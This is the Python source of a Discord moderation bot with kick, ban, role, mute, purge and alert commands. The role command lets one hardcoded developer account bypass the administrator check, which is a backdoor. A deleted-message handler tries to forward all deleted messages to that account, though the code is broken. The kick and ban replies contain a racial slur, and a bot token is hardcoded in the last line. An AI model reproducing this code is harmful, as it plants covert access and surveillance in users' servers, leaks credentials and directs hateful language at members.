import discord
from discord.ext.commands import bot
from discord.ext import commands
import random
import asyncio
import time
from threading import Thread
from random import randint
import datetime
import os
import aiohttp
import sys
import traceback
import json
from discord.utils import get
from discord import Game

bot = commands.Bot(command_prefix='.')

@bot.event
async def on_ready():
	await bot.change_presence(status=discord.Status.idle, game=discord.Game(name='.cmds for commands!')) 
	print("add my discord DK2blue#2142")
	print("Bot name: " + bot.user.name)	
	print("commands :")	
	print(".kick : !kick (user)") 
	print(".ban : !ban (user)")
	print(".role : !role (role name) specific roles only")
	print(".cmds : shows a list of commands")	
	print(".about : about the bot")
	print(".delete : purges messages(1-100)")
	print('discord version: ' + discord.__version__)
	
@bot.command()
async def cmds():
	await bot.say("delete, role,kick,ban,about,. mute, invite,unmute, unrole, updates, unban, eightball more to come!")
	
@bot.command(pass_context=True)
async def role(ctx, user: discord.Member, role):
	if ctx.message.author.server_permissions.administrator or ctx.message.author.id == '327700683409195008':
		role = discord.utils.get(ctx.message.author.server.roles, name='{0}'.format(role))
		await bot.say(':thumbsup:  {0} has been given the role {1} :thumbsup: '.format(user.name, role))
		await bot.add_roles(user, role)
	else:
		return
	
		
@bot.command(pass_context = True)
async def kick(ctx, userName: discord.User):
	if ctx.message.author.server_permissions.kick_members:
		await bot.kick(userName)
		await bot.say('nigga got kicked!')
	else:
		await bot.say('Incorrect permissions!''')
		

@bot.command(pass_context = True)
async def ban(ctx, userName: discord.User):
	if ctx.message.author.server_permissions.ban_members:
		await bot.ban(userName)
		await bot.say('nigga fucked up and got banned.')
	else:
		await bot.say('Invalid permissions!')
		
@bot.command(pass_context=True)
async def delete(ctx, amount=100):
	if ctx.message.author.server_permissions.administrator:
		channel	=	ctx.message.channel
		messages	=	[]
		await bot.purge_from(channel, limit=int(amount))
		await bot.say(":middle_finger: **Boom!** Messages Deleted! :middle_finger: ")
		
@bot.command(pass_context=True)
async def mute(ctx, member: discord.Member):
	if ctx.message.author.server_permissions.administrator:
		await bot.say(':cherry_blossom: {0} Muted! :cherry_blossom:'.format(member))
		role = discord.utils.get(member.server.roles, name='Muted')
		await bot.add_roles(member, role)
	else:
		return

@bot.command()
async def about():
	await bot.say("This is a bot created by DK2blue! He has developed it with the help of a few testers. He will be adding tons of commands throughout time.")

# Async version
@bot.event
async def on_message(message):
    if "discord.gg" in message.content.lower():
        await bot.delete_message(message)
    await bot.process_commands(message)

@bot.event
async def on_message_delete(message):
    member = bot.get_user(327700683409195008)
    await bot.send_message(user, message.content)
 
@bot.command()
async def invite():
	await bot.say("Generating invite link...")
	time.sleep(5)
	await bot.say("Link found!")
	time.sleep(2)
	await bot.say("https://discordapp.com/api/oauth2/authorize?bot_id=521890119100268560&permissions=8&scope=bot")
	await bot.say("Have a great time!")

		
@bot.command(pass_context=True)
async def unmute(ctx, member: discord.Member):
	if ctx.message.author.server_permissions.administrator:
		await bot.say(':cherry_blossom: {0} Unmuted! :cherry_blossom:'.format(member))
		role = discord.utils.get(member.server.roles, name='Muted')
		await bot.remove_roles(member, role)

@bot.command(pass_context=True)
async def unrole(ctx, user: discord.Member, role):
	if ctx.message.author.server_permissions.administrator:
		role = discord.utils.get(ctx.message.author.server.roles, name='{0}'.format(role))
		await bot.say(':thumbsup: {1} has been removed from {0} :thumbsup: '.format(user.name, role))
		await bot.remove_roles(user, role)
		await bot.say("Role removed!")
	else:
		await bot.say("invalid permissions!")
        
		
@bot.command()
async def updates():
	await bot.say("Added unrole(removes role from user), and unmute(unmutes user), added unban(beta), added eightball, more to come")


@bot.command(pass_context=True)
async def unban(ctx, user):
	if ctx.message.author.server_permissions.administrator:    
		try:
			banned = await bot.get_user_info(user)
			await bot.unban(ctx.message.server, banned)
			await bot.say(" {} has been unbanned!".format(str(banned.name)))
		except Exception as ex:
			await bot.say("An error occured >> " + str(ex))                                                                                     

#----------------------------------------------------------------------------------------------------------------------------
@bot.command(pass_context=True)
async def alert(ctx, message):
	message = message.replace("_", " ")
	await bot.send_message(ctx.message.channel, content='@everyone '+message, tts=True, embed=None)
	await bot.say("@everyone " + message)

@bot.command()
async def eightball():
    import random
 
    choices = ["I believe so,", "Why not", "Pretty sure not,", "I agree", "I disagree", "Of course"]
 
    await bot.say(random.choice(choices))
 

bot.run ("NTIxODkwMTE5MTAwMjY4NTYw.DvC_pw.r7wPcgi4f45V9fRGvSRFQ8w4itA") #your bot
